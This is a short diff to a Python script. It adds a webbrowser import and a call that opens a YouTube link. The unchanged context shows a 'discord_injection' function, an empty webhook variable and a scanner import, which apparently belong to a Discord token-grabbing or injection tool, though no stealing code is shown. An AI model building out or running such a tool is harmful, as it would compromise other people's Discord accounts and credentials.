@@ -10,6 +10,7 @@ import random
 import shutil
 import json
 import sys
+import webbrowser
 from scanner import scan_all
 
 red = "\033[31m"
@@ -38,6 +39,8 @@ print(f""" {yellow}
 os.system("cls")
 
 webhook = "" 
+
+
 
 def discord_injection():
     sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
@@ -70,6 +73,10 @@ def dossier():
             print("Error", e)
         try:
             os.system("start cmd")
+        except Exception as e:
+            print("Error", e)
+        try:
+            webbrowser.open("https://www.youtube.com/watch?v=TEjNPzf67n8")
         except Exception as e:
             print("Error", e)
 
